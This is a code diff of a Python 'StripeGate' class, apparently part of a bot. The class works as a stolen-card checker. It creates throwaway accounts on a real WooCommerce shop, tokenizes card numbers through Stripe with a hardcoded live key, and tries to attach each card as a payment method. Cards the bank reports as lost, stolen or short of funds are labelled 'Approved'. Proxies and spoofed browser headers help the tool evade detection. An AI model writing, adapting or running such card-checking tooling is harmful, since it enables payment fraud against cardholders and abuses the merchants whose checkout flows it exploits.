@@ -10,158 +10,166 @@ import random
 import string
 from BOT.tools.proxy import get_proxy
 
+# Stripe Keys from original API
+S_PK = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
+S_ACC = 'acct_1Mpulb2El1QixccJ'
+
 user_locks = {}
 
 
 class StripeGate:
-    """Stripe Auth Gate using legacygames.com - Real Checking"""
+    """Stripe Auth Gate using redbluechair.com - Real Checking (Original API)"""
     
     def __init__(self, proxy=None):
         self.s = requests.Session()
-        self.headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-        }
-        self.s.headers.update(self.headers)
         self.proxy = proxy
         
-        # Apply proxy if provided
+        # Apply proxy to session (but NOT for Stripe tokenization)
         if proxy:
             self.s.proxies = {'http': proxy, 'https': proxy}
+        
+        self.s.headers.update({
+            'authority': 'redbluechair.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'origin': 'https://redbluechair.com',
+            'referer': 'https://redbluechair.com/my-account/',
+            'upgrade-insecure-requests': '1',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"'
+        })
     
     def rnd_str(self, l=10):
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
     
-    def check_card(self, cc, mm, yy, cvv):
-        """Full Stripe Auth check"""
+    def reg(self):
+        """Register new account on redbluechair.com"""
         try:
-            # Format month
-            if int(mm) < 10 and '0' not in mm:
-                mm = f'0{mm}'
-            
-            # Format year
-            if len(yy) == 2:
-                yy = f'20{yy}'
-            
-            # Step 1: Get registration page and extract nonce
-            html_response = self.s.get('https://legacygames.com/my-account/add-payment-method/', timeout=30)
-            
-            reg_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html_response.text)
-            if not reg_match:
-                return "Declined ❌", "Failed to get registration nonce"
-            reg = reg_match.group(1)
-            
-            pk_live_match = re.search(r'pk_live_[a-zA-Z0-9]+', html_response.text)
-            if not pk_live_match:
-                return "Declined ❌", "Failed to get pk_live"
-            pk_live = pk_live_match.group(0)
-            
-            # Step 2: Register user
-            user = f"user{random.randint(1000, 9999)}{self.rnd_str(5)}"
-            email = f"{user}@gmail.com"
-            
-            data = {
-                'username': user,
-                'email': email,
-                'password': 'qeqweqweqwqw12312@',
-                'promo_referral_name': '',
-                'wc_order_attribution_source_type': 'typein',
-                'wc_order_attribution_referrer': '(none)',
-                'wc_order_attribution_utm_campaign': '(none)',
-                'wc_order_attribution_utm_source': '(direct)',
-                'wc_order_attribution_utm_medium': '(none)',
-                'wc_order_attribution_utm_content': '(none)',
-                'wc_order_attribution_utm_id': '(none)',
-                'wc_order_attribution_utm_term': '(none)',
-                'wc_order_attribution_utm_source_platform': '(none)',
-                'wc_order_attribution_utm_creative_format': '(none)',
-                'wc_order_attribution_utm_marketing_tactic': '(none)',
-                'wc_order_attribution_session_entry': 'https://legacygames.com/',
-                'wc_order_attribution_session_start_time': '2025-10-16 11:55:34',
-                'wc_order_attribution_session_pages': '17',
-                'wc_order_attribution_session_count': '1',
-                'wc_order_attribution_user_agent': self.headers['user-agent'],
-                'woocommerce-register-nonce': reg,
-                '_wp_http_referer': '/my-account/',
+            r1 = self.s.get('https://redbluechair.com/my-account/', timeout=30)
+            n = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
+            if not n:
+                return False
+            n = n.group(1)
+            rnd = self.rnd_str()
+            dt = {
+                'email': f'user{rnd}@gmail.com',
+                'password': f'Pass{rnd}!!',
                 'register': 'Register',
+                'woocommerce-register-nonce': n,
+                '_wp_http_referer': '/my-account/'
+            }
+            r2 = self.s.post('https://redbluechair.com/my-account/', data=dt, timeout=30)
+            return "Log out" in r2.text
+        except:
+            return False
+    
+    def tok(self, cc, mm, yy, cvv):
+        """Create Stripe payment method token (NO PROXY - as per original)"""
+        try:
+            h = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': self.s.headers['user-agent']
+            }
+            d = {
+                'type': 'card',
+                'card[number]': cc,
+                'card[cvc]': cvv,
+                'card[exp_year]': yy,
+                'card[exp_month]': mm,
+                'key': S_PK,
+                '_stripe_account': S_ACC,
+                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
+                'referrer': 'https://redbluechair.com',
+                'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
+                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
+                'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
+            }
+            # Stripe Tokenization (No Proxy Here Always)
+            r = requests.post('https://api.stripe.com/v1/payment_methods', headers=h, data=d, timeout=30)
+            result = r.json()
+            if 'id' in result:
+                return True, result['id']
+            elif 'error' in result:
+                return False, result['error'].get('message', 'Token Error')
+            return False, "Token Error"
+        except Exception as e:
+            return False, str(e)[:40]
+    
+    def add(self, pm):
+        """Add payment method and get response"""
+        try:
+            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/', timeout=30)
+            txt = r1.text
+            n = None
+            m1 = re.search(r'"createSetupIntentNonce":"([^"]+)"', txt)
+            if m1: n = m1.group(1)
+            if not n:
+                m2 = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', txt)
+                if m2: n = m2.group(1)
+            if not n:
+                m3 = re.search(r'"create_setup_intent_nonce":"([a-z0-9]+)"', txt)
+                if m3: n = m3.group(1)
+            
+            if not n:
+                return "Declined ❌", "Nonce Error"
+
+            h = self.s.headers.copy()
+            h.update({'x-requested-with': 'XMLHttpRequest', 'referer': 'https://redbluechair.com/my-account/add-payment-method/'})
+            
+            pl = {
+                'action': (None, 'create_setup_intent'),
+                'wcpay-payment-method': (None, pm),
+                '_ajax_nonce': (None, n)
             }
             
-            self.s.post('https://legacygames.com/my-account/', data=data, timeout=30)
+            r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files=pl, timeout=30)
+            js = r2.json()
             
-            # Step 3: Get add payment nonce
-            html2 = self.s.get('https://legacygames.com/my-account/add-payment-method/', timeout=30).text
-            
-            addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html2)
-            if not addnonce_match:
-                return "Declined ❌", "Failed to get payment nonce"
-            addnonce = addnonce_match.group(1)
-            
-            # Step 4: Create Stripe payment method (NO PROXY for Stripe API)
-            stripe_session = requests.Session()
-            data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=US&payment_user_agent=stripe.js%2F3eb96675be%3B+stripe-js-v3%2F3eb96675be%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flegacygames.com&time_on_page=13706&key={pk_live}'
-            
-            response_stripe = stripe_session.post('https://api.stripe.com/v1/payment_methods', headers=self.headers, data=data_stripe, timeout=30)
-            
-            try:
-                pm = response_stripe.json()['id']
-            except (KeyError, ValueError):
-                error_msg = response_stripe.json().get('error', {}).get('message', 'Unknown Stripe Error')
-                return "Declined ❌", error_msg[:50]
-            
-            # Step 5: Confirm setup intent
-            data_setup_intent = {
-                'action': 'wc_stripe_create_and_confirm_setup_intent',
-                'wc-stripe-payment-method': pm,
-                'wc-stripe-payment-type': 'card',
-                '_ajax_nonce': addnonce,
-            }
-            
-            response_final = self.s.post('https://legacygames.com/wp-admin/admin-ajax.php', data=data_setup_intent, timeout=30)
-            res = response_final.text
-            
-            # Parse response
-            if '"success":true' in res or '"success":True' in res:
+            if js.get('success') is True:
                 return "Approved ✅", "Card Approved"
-            elif 'succeded' in res:
-                return "Approved ✅", "Card Approved"
-            elif '"success":false' in res or '"success":False' in res:
-                if "expiration year is invalid" in res.lower():
-                    return "Declined ❌", "Expired Card"
-                elif "expiration month is invalid" in res.lower():
-                    return "Declined ❌", "Expired Card"
-                elif "card number is incorrect" in res.lower():
-                    return "Declined ❌", "Incorrect Number"
-                elif "security code is incorrect" in res.lower():
-                    return "CCN ✅", "CVC Mismatch"
-                elif "card was declined" in res.lower():
-                    return "Declined ❌", "Card Declined"
-                elif "insufficient funds" in res.lower():
-                    return "Approved ✅", "Insufficient Funds"
-                elif "do not honor" in res.lower():
-                    return "Approved ✅", "Do Not Honor"
-                elif "pickup card" in res.lower():
-                    return "Approved ✅", "Pickup Card"
-                elif "lost card" in res.lower():
-                    return "Approved ✅", "Lost Card"
-                elif "stolen card" in res.lower():
-                    return "Approved ✅", "Stolen Card"
-                elif "generic decline" in res.lower():
-                    return "Declined ❌", "Generic Decline"
-                else:
-                    # Extract error message
-                    try:
-                        resp_json = response_final.json()
-                        msg = resp_json.get('data', {}).get('error', {}).get('message', 'Unknown')
-                        return "Declined ❌", msg[:50]
-                    except:
-                        return "Declined ❌", "Unknown Error"
             else:
-                return "Declined ❌", "Unknown Response"
+                msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
+                msg_upper = msg.upper()
                 
-        except requests.exceptions.Timeout:
-            return "Declined ❌", "Timeout"
-        except requests.exceptions.ProxyError:
-            return "Declined ❌", "Proxy Error"
+                if any(kw in msg_upper for kw in ['INSUFFICIENT', 'FUNDS']):
+                    return "Approved ✅", "Insufficient Funds"
+                elif any(kw in msg_upper for kw in ['CVC', 'CVV', 'SECURITY CODE']):
+                    return "CCN ✅", "CVC Mismatch"
+                elif any(kw in msg_upper for kw in ['DO NOT HONOR']):
+                    return "Approved ✅", "Do Not Honor"
+                elif any(kw in msg_upper for kw in ['LOST', 'STOLEN']):
+                    return "Approved ✅", msg[:40]
+                elif any(kw in msg_upper for kw in ['3D', 'AUTHENTICATION', 'SECURE']):
+                    return "Approved ✅", "3D Secure"
+                else:
+                    return "Declined ❌", msg[:40]
+        except Exception as e:
+            return "Declined ❌", str(e)[:40]
+    
+    def check_card(self, cc, mm, yy, cvv):
+        """Full check flow"""
+        try:
+            # Step 1: Register
+            if not self.reg():
+                return "Declined ❌", "Registration Failed"
+            
+            # Step 2: Tokenize
+            tok_success, tok_result = self.tok(cc, mm, yy, cvv)
+            if not tok_success:
+                return "Declined ❌", tok_result
+            
+            # Step 3: Add payment method
+            return self.add(tok_result)
+            
         except Exception as e:
             return "Declined ❌", str(e)[:40]
 
